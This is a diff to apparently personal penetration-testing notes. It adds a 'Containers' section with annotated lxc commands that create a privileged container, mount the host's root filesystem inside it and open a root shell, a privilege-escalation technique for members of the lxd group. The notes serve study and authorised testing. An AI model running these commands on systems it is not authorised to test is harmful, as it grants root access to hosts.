@@ -301,3 +301,17 @@ $ ./pspy64 -pf -i 1000
 %% command-line tool used to view running processes without the need for root privileges. The -pf flag tells the tool to print commands and file system events and -i 1000 tells it to scan procfs every 1000ms (or every second) %%
 
 ### Containers
+```
+$ lxc image import ubuntu-template.tar.xz --alias ubuntutemp
+$ lxc image list
+$ lxc init ubuntutemp privesc -c security.privileged=true
+$ lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true
+```
+%% if we are in the lxc or lxd group, we can run this sequence of commands to import a container image and configure it by specifying the security.privileged flag and the root path for the container.  %%
+
+```
+$ lxc start privesc
+$ lxc exec privesc /bin/bash
+# ls -l /mnt/root
+```
+%% Once we have done that, we can start the container and log into it. In the container, we can then go to the path we specified to access the resource of the host system as root. %%
